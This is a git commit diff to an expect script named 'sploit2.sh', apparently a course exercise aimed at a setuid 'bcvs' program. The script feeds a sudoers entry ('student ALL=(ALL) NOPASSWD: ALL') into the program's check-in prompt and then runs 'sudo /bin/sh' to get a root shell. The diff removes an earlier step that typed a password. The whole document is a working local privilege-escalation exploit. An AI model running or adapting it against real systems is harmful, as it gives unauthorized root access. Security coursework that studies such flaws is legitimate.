86b82029c7e1a962f4ffb32fb69be0f6b5dc2210
Alex Biedny <abiedny09@gmail.com>
2020-10-19 17:46:36 -0400

    sploit2 finally actually done

--- sploit2.sh
+++ sploit2.sh
@@ -11,10 +11,6 @@ cd ..
 cd ~/test
 spawn /opt/bcvs/bcvs ci anything.txt
 expect "Please write a SHORT explanation:\r"
-send "student ALL=(ALL) ALL\n"
-
-spawn sudo /bin/sh
-expect "*?assword"
-send "security\r"
+send "student ALL=(ALL) NOPASSWD: ALL\n"
 '
 sudo /bin/sh
